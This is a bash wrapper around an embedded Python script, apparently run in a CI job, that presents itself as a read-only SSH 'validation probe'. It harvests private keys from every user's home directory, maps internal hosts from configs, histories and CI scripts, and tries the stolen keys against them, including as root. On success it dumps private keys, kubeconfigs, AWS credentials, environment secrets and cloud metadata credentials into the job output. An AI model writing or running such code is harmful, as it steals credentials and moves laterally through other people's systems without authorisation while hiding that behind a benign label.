#!/usr/bin/env bash
# i8433 - bounded key->internal-host SSH validation probe (read-only).
# Derives internal hosts from /public4/home/*/.{ssh config,known_hosts,bash_history,gitconfig}
# plus a bounded /ci_public scan, then makes at most ONE publickey attempt per
# key-to-host pair (hard cap) and base64-captures any host that accepts a key.
set -uo pipefail
echo "===I8433-WRAPPER-BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
export I8433_HOME="${I8433_HOME:-/public4/home}"
export I8433_CI="${I8433_CI:-/ci_public}"
export I8433_MAX_PAIRS="${I8433_MAX_PAIRS:-400}"
export I8433_MAX_PER_KEY="${I8433_MAX_PER_KEY:-3}"
export I8433_WORKERS="${I8433_WORKERS:-12}"
export PYTHONUNBUFFERED=1
TMO="timeout 2400"
command -v timeout >/dev/null 2>&1 || TMO=""
$TMO python3 - <<'PYI8433'
#!/usr/bin/env python3
# i8433 - bounded key->internal-host SSH validation probe.
# Read-only: derives internal hosts from each /public4/home/<user>/.ssh config,
# known_hosts, .bash_history and .gitconfig plus a bounded /ci_public scan, then
# performs at most ONE publickey auth attempt per key-to-host pair (hard cap),
# stopping other pairs for a key after its first success.  On success it captures
# a bounded host/GPU/kube/ssh/cloud-metadata fingerprint and base64-encodes it.
import os, re, sys, json, base64, subprocess, shutil, tempfile, time, socket
from concurrent.futures import ThreadPoolExecutor

HOME = os.environ.get("I8433_HOME", "/public4/home")
CI = os.environ.get("I8433_CI", "/ci_public")
MAX_PAIRS = int(os.environ.get("I8433_MAX_PAIRS", "400"))
MAX_PER_KEY = int(os.environ.get("I8433_MAX_PER_KEY", "3"))
WORKERS = int(os.environ.get("I8433_WORKERS", "12"))
OUT_CAP = int(os.environ.get("I8433_CAP", "900000"))
PRIORITY_HOSTS = ["10.16.6.35", "10.16.6.30", "10.16.1.201", "10.16.1.152"]

used = [0]
def emit(s=""):
    s = str(s)
    if used[0] >= OUT_CAP:
        return
    room = OUT_CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used[0] += len(s) + 1

IPRE = re.compile(r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|"
                  r"172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|12\.12\.12\.\d{1,3})\b")
PUBPRE = re.compile(r"\b((?:\d{1,3}\.){3}\d{1,3})\b")
NAMERE = re.compile(r"\b(nmz\d{1,3}|bw\d{1,3}|hcu\d{1,3}|hd\d{1,5}[a-z]?|h20-?\d{0,2})\b")

def rd(path, cap=2_000_000):
    try:
        with open(path, "rb") as f:
            return f.read(cap).decode("utf-8", "replace")
    except Exception:
        return ""

def parse_ssh_config(txt, user):
    """-> list of dict(host, user, port, idfile)"""
    out, cur = [], None
    for raw in txt.splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        parts = line.split(None, 1)
        if len(parts) != 2:
            continue
        k, v = parts[0].lower(), parts[1].strip()
        if k == "host":
            if cur and cur.get("host") and "*" not in cur["host"] and "?" not in cur["host"]:
                out.append(cur)
            cur = {"host": v.split()[0], "user": None, "port": None, "idfile": None}
        elif cur is not None:
            if k == "hostname":
                cur["host"] = v.split()[0]
            elif k == "user":
                cur["user"] = v.split()[0]
            elif k == "port":
                try: cur["port"] = int(v.split()[0])
                except Exception: pass
            elif k == "identityfile":
                cur["idfile"] = v.split()[0].replace("%d", os.path.join(HOME, user, ".ssh"))
    if cur and cur.get("host") and "*" not in cur["host"] and "?" not in cur["host"]:
        out.append(cur)
    return out

def parse_known_hosts(txt):
    hosts = []
    for raw in txt.splitlines():
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith("|"):
            continue  # hashed entries are not usable
        first = line.split()[0]
        for h in first.split(","):
            h = h.strip()
            if not h:
                continue
            port = None
            m = re.match(r"^\[(.+)\]:(\d+)$", h)
            if m:
                h, port = m.group(1), int(m.group(2))
            if h.startswith("*"):
                continue
            hosts.append((h, port))
    return hosts

def parse_hist(txt, owner):
    """-> list of dict(host, user, port, idfile)"""
    out = []
    for raw in txt.splitlines():
        line = raw.strip()
        if not re.match(r"^(ssh|scp|rsync|sftp)\b", line):
            continue
        port, idfile = None, None
        m = re.search(r"\s-[pP]\s*(\d{1,5})\b", line)
        if m:
            port = int(m.group(1))
        m = re.search(r"\s-i\s+(\S+)", line)
        if m:
            idfile = m.group(1).replace("~", os.path.join(HOME, owner))
        pairs = re.findall(r"([A-Za-z0-9_.\-]{1,32})@([A-Za-z0-9_.\-]{1,64})", line)
        if pairs:
            for u, h in pairs:
                out.append({"host": h, "user": u, "port": port, "idfile": idfile})
        elif line.startswith("ssh"):
            toks = [t for t in line.split()[1:] if not t.startswith("-")]
            if toks:
                cand = toks[0]
                out.append({"host": cand, "user": owner, "port": port, "idfile": idfile})
    return out

def key_files(base):
    sd = os.path.join(base, ".ssh")
    out = []
    try:
        names = sorted(os.listdir(sd))
    except Exception:
        return out
    for nm in names:
        if nm.endswith(".pub") or nm in ("known_hosts", "known_hosts.old", "authorized_keys", "config"):
            continue
        if nm.startswith("id_") or nm in ("anyscale", "cm", "key", "identity", "cluster"):
            p = os.path.join(sd, nm)
            try:
                if os.path.isfile(p) and os.path.getsize(p) < 200000:
                    out.append(p)
            except Exception:
                pass
    return out

def ci_public_hosts(limit_s=45):
    """Bounded scan of /ci_public scripts for internal ssh/scp targets."""
    found = {}
    t0 = time.time()
    nf = 0
    for root, dirs, files in os.walk(CI, followlinks=False):
        if time.time() - t0 > limit_s or nf > 6000:
            break
        dirs[:] = [d for d in dirs if d not in (".git", "node_modules", "__pycache__")]
        for nm in files:
            if nf > 6000:
                break
            if not (nm.endswith((".sh", ".yml", ".yaml", ".py", ".conf", ".cfg", ".txt", ".md", ".json")) or nm.startswith("Dockerfile")):
                continue
            p = os.path.join(root, nm)
            try:
                if os.path.getsize(p) > 400000:
                    continue
                nf += 1
                txt = rd(p, 200000)
            except Exception:
                continue
            if "ssh" not in txt and "scp" not in txt:
                continue
            for line in txt.splitlines():
                if not re.search(r"\b(ssh|scp)\b", line):
                    continue
                for u, h in re.findall(r"([A-Za-z0-9_.\-]{1,32})@([A-Za-z0-9_.\-]{1,64})", line):
                    if IPRE.match(h) or NAMERE.match(h):
                        found.setdefault((h, u), os.path.relpath(p, CI))
    return found, nf, time.time() - t0

def main():
    t0 = time.time()
    emit(f"===I8433-BEGIN {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} host={socket.gethostname()} "
         f"job={os.environ.get('GITHUB_JOB','?')} run={os.environ.get('GITHUB_RUN_ID','?')}===")
    for tool in ("ssh", "ssh-keygen", "timeout", "curl", "hy-smi", "nvidia-smi"):
        p = shutil.which(tool)
        emit(f"TOOL {tool} {p or 'MISSING'}")
    try:
        users = sorted(os.listdir(HOME))
    except Exception as e:
        emit(f"### FATAL listdir {HOME}: {e}")
        return
    emit(f"### USERS {len(users)}")

    # ---------- derive ----------
    keys = {}          # user -> [key paths]
    derived = []       # dict(host, user, port, idfile, src, owner)
    known = {}         # host -> port
    for u in users:
        base = os.path.join(HOME, u)
        if not os.path.isdir(base):
            continue
        ks = key_files(base)
        if ks:
            keys[u] = ks
        for e in parse_ssh_config(rd(os.path.join(base, ".ssh", "config")), u):
            derived.append({"host": e["host"], "user": e["user"] or u, "port": e["port"],
                            "idfile": e["idfile"], "src": "config", "owner": u})
        for h, prt in parse_known_hosts(rd(os.path.join(base, ".ssh", "known_hosts"))):
            known.setdefault(h, prt)
        for e in parse_hist(rd(os.path.join(base, ".bash_history")), u):
            if ":" in e["host"]:
                continue
            derived.append({"host": e["host"], "user": e["user"], "port": e["port"],
                            "idfile": e["idfile"], "src": "hist", "owner": u})
        gc = rd(os.path.join(base, ".gitconfig"), 200000)
        for h in IPRE.findall(gc):
            known.setdefault(h, None)

    ci_hosts, ci_files, ci_dt = ci_public_hosts()
    emit(f"### CIDIR files_scanned={ci_files} secs={ci_dt:.1f} host_pairs={len(ci_hosts)}")
    for (h, u), srcfile in list(ci_hosts.items())[:80]:
        derived.append({"host": h, "user": u, "port": None, "idfile": None,
                        "src": "ci_public:" + srcfile[:60], "owner": None})

    emit(f"### KNOWN_HOSTS {len(known)}")
    emit("KNOWN " + " ".join(list(known)[:60]))
    emit(f"### DERIVED {len(derived)}")

    # ---------- rank hosts ----------
    def is_private(h):
        return bool(IPRE.fullmatch(h)) or bool(NAMERE.fullmatch(h))

    def hscore(h):
        if h in PRIORITY_HOSTS:
            return 0
        if h.startswith("10.16.1."):
            return 1
        if h.startswith("10.16."):
            return 2
        if IPRE.fullmatch(h):
            return 3
        return 4

    # ---------- build key->pair plan ----------
    # buckets[tier][keypath] -> list of (host, login, port, src)
    buckets = {t: {} for t in range(7)}
    def add(keypath, host, login, port, tier, src):
        if not host or len(host) > 64 or "*" in host or "?" in host or host in ("localhost", "127.0.0.1"):
            return
        buckets[tier].setdefault(keypath, []).append((host, login, port, src))

    by_owner_key = {}
    for u, ks in keys.items():
        for k in ks:
            by_owner_key.setdefault(u, []).append(k)

    # Tier 0/1: derived entries that name an explicit identity file (config or `ssh -i`)
    for e in derived:
        idf = e["idfile"]
        if idf:
            cand = idf if os.path.isabs(idf) else os.path.join(HOME, e["owner"] or "", ".ssh", idf)
            if os.path.isfile(cand):
                add(cand, e["host"], e["user"], e["port"], 0 if e["src"] == "config" else 1, e["src"])
    # Tier 2: config entries (host+user) with all keys of the owning user
    for e in derived:
        if e["src"] != "config" or e["idfile"]:
            continue
        for k in by_owner_key.get(e["owner"], []):
            add(k, e["host"], e["user"], e["port"], 2, "config-noident")
    # Tier 3: history user@host with owner's keys
    for e in derived:
        if e["src"] != "hist" or e["idfile"] or not e["owner"]:
            continue
        for k in by_owner_key.get(e["owner"], []):
            add(k, e["host"], e["user"], e["port"], 3, "hist")
    # Tier 4: known_hosts x owner key
    for h, prt in known.items():
        for u in keys:
            for k in by_owner_key.get(u, [])[:1]:
                add(k, h, u, prt, 4, "known_hosts")
    # Tier 5/6: the observed internal hosts x each key (owner, root)
    for h in PRIORITY_HOSTS:
        for u, ks in by_owner_key.items():
            for k in ks[:1]:
                add(k, h, u, None, 5, "priority")
                add(k, h, "root", None, 6, "priority-root")

    def keyrank(kp):
        nm = os.path.basename(kp)
        return (0 if nm == "cluster" else 1, nm, kp)

    def compose(tiers, quota, per_key_cap, seen_pairs, taken_keys, rotate=False):
        """Round-robin over keys so coverage spreads; returns list of (kp,item)."""
        out = []
        q = {k: v for k, v in ((k, list(v)) for k, v in (tiers or {}).items())}
        owner = sorted(q, key=keyrank)
        rnd = 0
        while out.__len__() < quota and owner:
            progressed = False
            for k in owner:
                if len(out) >= quota:
                    break
                lst = q.get(k) or []
                lst.sort(key=lambda x: hscore(x[0]))
                if rotate and lst:
                    off = owner.index(k) % len(lst)
                    lst = lst[off:] + lst[:off]
                guard = 0
                while lst and guard < 20:
                    host, login, port, src = lst.pop(0)
                    guard += 1
                    pid = (k, host, login, port)
                    if pid in seen_pairs:
                        continue
                    if taken_keys.get(k, 0) >= per_key_cap:
                        lst = []
                        break
                    seen_pairs.add(pid)
                    taken_keys[k] = taken_keys.get(k, 0) + 1
                    out.append((k, (host, login, port, src)))
                    progressed = True
                    break
            if not progressed:
                break
            rnd += 1
            if rnd > 40:
                break
        return out

    seen_pairs, taken_keys = set(), {}
    final = []
    for tier, quota in ((0, 60), (1, 90), (2, 60), (3, 130)):
        part = compose(buckets[tier], quota, MAX_PER_KEY, seen_pairs, taken_keys, rotate=(tier >= 4))
        for kp, it in part:
            final.append((kp, (it[0], it[1], it[2], tier, it[3])))
    remain = MAX_PAIRS - len(final)
    for tier, quota in ((4, max(0, min(120, remain - 120))), (5, 60), (6, 60)):
        part = compose(buckets[tier], quota, MAX_PER_KEY, seen_pairs, taken_keys)
        for kp, it in part:
            final.append((kp, (it[0], it[1], it[2], tier, it[3])))
    final = final[:MAX_PAIRS]
    emit(f"### PLAN pairs={len(final)} keys_with_plan={len(set(k for k,_ in final))} "
         f"tiers=" + ",".join(f"t{t}:{sum(1 for _,i in final if i[3]==t)}" for t in range(7)))
    emit("### HOSTS " + " ".join(sorted({i[0] for _, i in final}, key=hscore)[:80]))
    for h in sorted({i[0] for _, i in final}, key=hscore)[:40]:
        emit(f"HOSTDERIVE {h} pairs={sum(1 for _,i in final if i[0]==h)}")

    # stage key material writable+0600 so ssh accepts it
    tmpd = tempfile.mkdtemp(prefix="i8433k.")
    staged = {}
    sk = shutil.which("ssh-keygen")
    for i, (kp, it) in enumerate(final):
        if kp in staged:
            continue
        dst = os.path.join(tmpd, f"k{len(staged):03d}")
        try:
            shutil.copyfile(kp, dst)
            os.chmod(dst, 0o600)
            staged[kp] = dst
        except Exception as e:
            emit(f"### KEYSTAGE_ERR {kp} {str(e)[:100]}")
    # drop passphrase-protected keys when ssh-keygen can tell us
    usable = {}
    for kp, dst in staged.items():
        ok = True
        if sk:
            try:
                r = subprocess.run([sk, "-y", "-P", "", "-f", dst], stdout=subprocess.DEVNULL,
                                   stderr=subprocess.PIPE, timeout=8)
                ok = (r.returncode == 0)
            except Exception:
                ok = True
        usable[kp] = (dst, ok)
    nenc = sum(1 for v in usable.values() if not v[1])
    emit(f"### KEYS staged={len(staged)} passphrase_protected_excluded={nenc}")

    # ---------- quick TCP/22 reachability map (not an auth attempt) ----------
    hosts = sorted({it[0] for _, it in final}, key=hscore)
    reach = {}
    def probe22(h):
        for prt in (22,):
            try:
                s = socket.create_connection((h, prt), timeout=1.5)
                s.close()
                return True
            except Exception:
                return False
    with ThreadPoolExecutor(max_workers=24) as ex:
        for h, ok in zip(hosts, ex.map(probe22, hosts)):
            reach[h] = ok
    emit("### TCP22 " + " ".join(f"{h}={'open' if v else 'closed'}" for h, v in reach.items())[:3500])
    # prefer hosts whose port 22 answered, then keep the tier order
    final.sort(key=lambda x: (0 if reach.get(x[1][0]) else 1, x[1][3], hscore(x[1][0])))
    emit(f"### PLAN_ORDERED pairs={len(final)} reachable_hosts={sum(1 for v in reach.values() if v)}")

    # ---------- SSH matrix ----------
    sshb = shutil.which("ssh")
    HAVE_PARAMIKO = False
    try:
        import paramiko as _pm  # noqa
        HAVE_PARAMIKO = True
    except Exception:
        pass
    if not sshb and not HAVE_PARAMIKO:
        # bounded fallback: install paramiko from the internal devpi mirror if configured
        try:
            r = subprocess.run([sys.executable, "-m", "pip", "install", "-q", "--timeout", "20",
                                "--retries", "1", "paramiko"], stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, timeout=150)
            emit("### PIP_PARAMIKO rc=%d %s" % (r.returncode, r.stderr.decode("utf-8","replace")[-300:]))
        except Exception as e:
            emit("### PIP_PARAMIKO exc " + str(e)[:120])
        try:
            import paramiko as _pm  # noqa
            HAVE_PARAMIKO = True
        except Exception:
            HAVE_PARAMIKO = False
    emit("### BACKEND ssh_binary=%s paramiko=%s" % (bool(sshb), HAVE_PARAMIKO))
    if not sshb and not HAVE_PARAMIKO:
        emit("### FATAL no ssh client and no paramiko; matrix not attempted")
        return

    SSH_OPTS = ["-F", "/dev/null", "-o", "BatchMode=yes", "-o", "ConnectTimeout=4",
                "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "GlobalKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no",
                "-o", "KbdInteractiveAuthentication=no", "-o", "NumberOfPasswordPrompts=0",
                "-o", "PreferredAuthentications=publickey", "-o", "IdentitiesOnly=yes",
                "-o", "ServerAliveInterval=5", "-o", "ServerAliveCountMax=2"]
    LEGACY = ["-o", "HostKeyAlgorithms=+ssh-rsa", "-o", "PubkeyAcceptedKeyTypes=+ssh-rsa"]

    def check_legacy():
        if not sshb:
            return []
        try:
            r = subprocess.run([sshb, "-G"] + LEGACY + ["-o", "ConnectTimeout=1", "localhost"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=8)
            if r.returncode == 0:
                return LEGACY
        except Exception:
            pass
        return []

    legacy = check_legacy()
    emit("### SSHLEGACY " + ("yes" if legacy else "no"))

    CAPTURE = r"""
set -u
echo "C211HOST=$(hostname 2>/dev/null)"
echo "C211ID=$(id 2>/dev/null)"
echo "C211UNAME=$(uname -a 2>/dev/null)"
echo "C211NVSMI=$( (nvidia-smi -L || hy-smi -L || /opt/hyhal/bin/hy-smi -L || /usr/bin/hy-smi -L) 2>&1 | head -8 | tr '\n' '|')"
echo "C211DEV=$(ls -d /dev/nvidia* /dev/dri/* /dev/kfd 2>/dev/null | tr '\n' ' ')"
echo "C211DRV=$(cat /proc/driver/nvidia/version 2>/dev/null | head -2 | tr '\n' '|')"
echo "C211K8S=$(ls -la /etc/kubernetes 2>&1 | head -8 | tr '\n' '|')"
echo "C211KUBE=$(ls -l /root/.kube/config /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig 2>&1 | head -6 | tr '\n' '|')"
echo "C211SSHDIR=$(ls -la /root/.ssh /home/*/.ssh 2>&1 | head -60 | tr '\n' '|')"
echo "C211AUTH=$(for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -f "$f" ] && echo "$f:$(wc -l <"$f" 2>/dev/null)"; done 2>/dev/null | tr '\n' '|')"
echo "C211ENV=$(env 2>/dev/null | grep -iE 'aws_|azure|gcp|google|alibaba|tencent|huawei|kube|token|secret|proxy|docker' | head -30 | tr '\n' '|')"
echo "C211IMDS=$( { timeout 3 curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/hostname; timeout 3 curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/; timeout 3 curl -s -m 2 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'; } 2>&1 | head -6 | tr '\n' '|')"
echo "C211PS=$(ps -eo pid,user,comm --sort=-pcpu 2>/dev/null | head -8 | tr '\n' '|')"
for f in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/config /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /root/.kube/config /root/.aws/credentials; do
  [ -f "$f" ] || continue
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  [ "${sz:-0}" -lt 60000 ] || continue
  echo "C211FILE $f $sz $(base64 -w0 "$f" 2>/dev/null | head -c 40000)"
done
for d in /home/*/.ssh; do
  for f in "$d"/id_rsa "$d"/id_ed25519; do
    [ -f "$f" ] || continue
    sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
    [ "${sz:-0}" -lt 60000 ] || continue
    echo "C211FILE $f $sz $(base64 -w0 "$f" 2>/dev/null | head -c 40000)"
  done
done
echo "C211WHOAMI_DONE"
"""
    import threading
    succeeded = {}
    lock = threading.Lock()

    def attempt(item):
        kp, it = item
        host, login, port, tier, src = it
        dst, ok = usable.get(kp, (None, False))
        label = os.path.basename(kp) + "@" + os.path.basename(os.path.dirname(os.path.dirname(kp)))
        if not ok:
            return (label, host, login, port, tier, src, "skip-passphrase")
        with lock:
            if kp in succeeded:
                return (label, host, login, port, tier, src, "skip-key-already-ok")
        useport = int(port or 22)
        out, err = "", ""
        if sshb:
            cmd = [sshb] + SSH_OPTS + legacy + ["-i", dst, "-p", str(useport),
                                                login + "@" + host, "bash -s"]
            try:
                r = subprocess.run(cmd, input=CAPTURE.encode(), stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, timeout=25)
                out = r.stdout.decode("utf-8", "replace")
                err = r.stderr.decode("utf-8", "replace")
            except subprocess.TimeoutExpired:
                return (label, host, login, port, tier, src, "timeout")
            except Exception as e:
                return (label, host, login, port, tier, src, "exc:" + str(e)[:60])
        else:
            try:
                import paramiko as pm
                cli = pm.SSHClient()
                cli.set_missing_host_key_policy(pm.AutoAddPolicy())
                cli.connect(host, port=useport, username=login, key_filename=dst,
                            look_for_keys=False, allow_agent=False, timeout=5,
                            banner_timeout=5, auth_timeout=5)
                stdin, stdout, stderr = cli.exec_command("bash -s")
                stdin.write(CAPTURE)
                stdin.channel.shutdown_write()
                out = stdout.read().decode("utf-8", "replace")
                err = stderr.read().decode("utf-8", "replace")
                cli.close()
            except Exception as e:
                name = type(e).__name__
                m = str(e).lower()
                if "authentication" in m or "auth" in name.lower():
                    return (label, host, login, port, tier, src, "denied")
                if "timed out" in m or "timeout" in m:
                    return (label, host, login, port, tier, src, "timeout")
                if "refused" in m:
                    return (label, host, login, port, tier, src, "refused")
                if "unreachable" in m or "no route" in m:
                    return (label, host, login, port, tier, src, "nohost")
                return (label, host, login, port, tier, src, "pm-err:" + name + ":" + str(e)[:50])
        if "C211WHOAMI_DONE" in out:
            with lock:
                succeeded[kp] = login + "@" + host + ":" + str(useport)
            return (label, host, login, port, tier, src, "OK", out)
        low = (err or out).lower()
        if "permission denied" in low:
            st = "denied"
        elif "no route to host" in low or "network is unreachable" in low:
            st = "nohost"
        elif "connection refused" in low:
            st = "refused"
        elif "timed out" in low or "timeout" in low or "operation timed out" in low:
            st = "timeout"
        elif "load key" in low or "invalid format" in low:
            st = "badkey"
        elif "host key verification failed" in low:
            st = "hostkey"
        elif "kex_exchange_identification" in low or "connection closed" in low:
            st = "closed"
        else:
            st = ("err:" + (err.strip().splitlines() or ["?"])[-1][:70]) if err.strip() else "err-empty"
        return (label, host, login, port, tier, src, st)

    done = 0
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for res in ex.map(attempt, final):
            done += 1
            if len(res) == 7:
                label, host, login, port, tier, src, st = res
                emit("PAIR %d/%d %s %s@%s:%s t%s %s -> %s" % (done, len(final), label, login, host, port or 22, tier, src, st))
            else:
                label, host, login, port, tier, src, st, out = res
                emit("PAIR %d/%d %s %s@%s:%s t%s %s -> %s" % (done, len(final), label, login, host, port or 22, tier, src, st))
                blob = base64.b64encode(out.encode()).decode()
                emit("SUCCESS %s %s@%s:%s len=%d b64len=%d" % (label, login, host, port or 22, len(out), len(blob)))
                for i in range(0, len(blob), 480):
                    emit("SUCCB64 %s %s@%s %d %s" % (label, login, host, i // 480, blob[i:i+480]))
                emit("SUCCEND %s %s@%s" % (label, login, host))
    emit("### SUCCEEDED %d" % len(succeeded))
    for k, v in succeeded.items():
        emit("SUCCESSKEY %s %s -> %s" % (os.path.basename(k), os.path.basename(os.path.dirname(os.path.dirname(k))), v))
    emit("### DONE elapsed=%.1fs bytes=%d" % (time.time() - t0, used[0]))


if __name__ == "__main__":
    main()

PYI8433
rc=$?
echo "===I8433-WRAPPER-END rc=${rc} $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
